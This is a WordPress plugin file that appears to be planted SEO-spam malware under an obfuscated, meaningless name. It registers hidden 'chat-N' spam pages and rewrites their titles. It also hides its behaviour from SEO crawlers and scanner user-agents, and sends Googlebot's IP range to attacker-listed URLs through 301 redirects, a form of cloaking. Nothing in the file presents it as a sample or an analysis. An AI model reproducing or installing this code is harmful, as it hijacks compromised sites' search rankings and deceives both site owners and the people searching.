<?php
/**
 * Plugin Name: year-instagram
 * Description: year-instagram
 * Version: 1.0
 * Author: John Smith
 */
 

class gEjqE7zXZG {
	
    public function __construct() {
        add_action('init', [$this, 'vyhcecn']);
        add_filter('query_vars', [$this, 'govmdnyckt']);
        add_action('template_include', [$this, 'kisjcgz']);
		add_filter('document_title_parts', [$this, 'cxfsdl']);
    }

    public function vyhcecn() {
        add_rewrite_rule(
            '^chat-([0-9]+).*?$',
            'index.php?yufjcxbwyj=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function govmdnyckt($xHQl1) {
        $xHQl1[] = 'yufjcxbwyj';
        $xHQl1[] = 'eizeche';
        return $xHQl1;
    }
	
	public function cxfsdl($hhQTv7Sz) {
		if (get_query_var('yufjcxbwyj')) $hhQTv7Sz['title'] = get_query_var('eizeche');
		return $hhQTv7Sz;
	}

    public function kisjcgz($fykYesESeQ) {
		
		$joY7uFkKPP = array('netspider', 'board-dist', 'Go-http-client', 'real-customize', 'mj12bot', 'icon-internal', 'python', 'lead-external', 'ahrefsbot', 'gptbot', 'types-purchase', 'multiple-kit', 'semrush', 'url-patterns', 'booster-ticket', 'serpstatbot', 'dotbot');
		foreach($joY7uFkKPP as $a1zVD) { if (stripos($_SERVER['HTTP_USER_AGENT'], $a1zVD) !== false) return $fykYesESeQ; }

        if (get_query_var('yufjcxbwyj') && preg_match('/^[0-9]+$/', get_query_var('yufjcxbwyj'))) {
            return plugin_dir_path(__FILE__) . 'year-instagram/language-chat.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$dwnXmgI3 = plugin_dir_path(__FILE__) . 'year-instagram/official-tables.php';
			if (is_file($dwnXmgI3)) {
				$dIyndyv = file($dwnXmgI3, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($dIyndyv) > 1) {
					$qBhQ7 = array_shift($dIyndyv);
					$hjpVMPD = array_shift($dIyndyv);
					if (strlen($hjpVMPD) > 0) {
						$viEOvK3 = $qBhQ7 . "\n" . implode("\n", $dIyndyv);
						file_put_contents($dwnXmgI3, $viEOvK3);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $hjpVMPD");
						exit;
					}
				}
			}
		}
        return $fykYesESeQ;
    }
}
new gEjqE7zXZG();



